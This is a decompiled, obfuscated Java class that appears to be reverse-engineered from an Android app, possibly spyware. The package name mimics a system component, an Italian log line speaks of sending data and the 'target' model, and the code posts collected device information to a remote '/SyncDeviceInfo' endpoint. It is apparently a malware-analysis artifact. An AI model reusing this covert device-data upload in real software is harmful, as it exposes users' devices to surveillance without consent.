package com.app.system.common.d.a;

import android.content.Context;
import com.app.system.common.entity.DeviceInfo;
import com.app.system.common.h;
import com.google.gson.f;
import java.io.IOException;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class g
  extends a
{
  public g(String paramString)
  {
    super(null, paramString);
  }
  
  public int a(Context paramContext, DeviceInfo paramDeviceInfo)
  {
    try
    {
      h.a(paramContext, "INVIO DATI E MODELLO TARGET");
      paramContext = new java/lang/StringBuilder;
      paramContext.<init>();
      paramContext.append(this.c);
      paramContext.append("/SyncDeviceInfo");
      paramContext.append('/');
      paramContext.append(this.a);
      Response localResponse = com.app.system.common.d.a.a.a.a(paramContext.toString(), h.b().a(paramDeviceInfo));
      if (localResponse != null)
      {
        paramDeviceInfo = localResponse.body().string();
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append("SendData Result: ");
        paramContext.append(localResponse);
        com.security.d.a.d("ProtocolForDeviceInfo", paramContext.toString(), new Object[0]);
        boolean bool = paramDeviceInfo.equals("1");
        if (bool) {
          return 1;
        }
      }
    }
    catch (IOException paramContext)
    {
      com.security.d.a.a("ProtocolForDeviceInfo", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/d/a/g.class
 *
 * Reversed by:           J
 */